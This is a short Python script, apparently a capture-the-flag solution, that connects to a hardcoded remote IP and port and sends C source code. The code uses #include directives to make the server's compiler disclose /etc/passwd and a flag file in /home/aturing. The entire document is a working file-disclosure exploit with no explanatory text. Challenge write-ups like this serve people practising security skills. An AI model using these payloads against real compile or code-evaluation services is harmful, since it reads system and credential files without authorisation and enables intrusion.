import socket

def trial(payload):
	lines=payload.split('\n')
	sc=socket.create_connection(("46.101.173.184", 1342))
	data=sc.recv(1024)
	sc.send('%s\n'%len(lines))
	data=sc.recv(1024)
	sc.send('\n'.join(lines)+'\n')
	data=sc.recv(1024)
	data=sc.recv(1024)
	print data

trial('#include "/etc/passwd"')
trial('#include "/home/aturing/flag"')
trial("""int a() {
#include "/home/aturing/flag"
}""")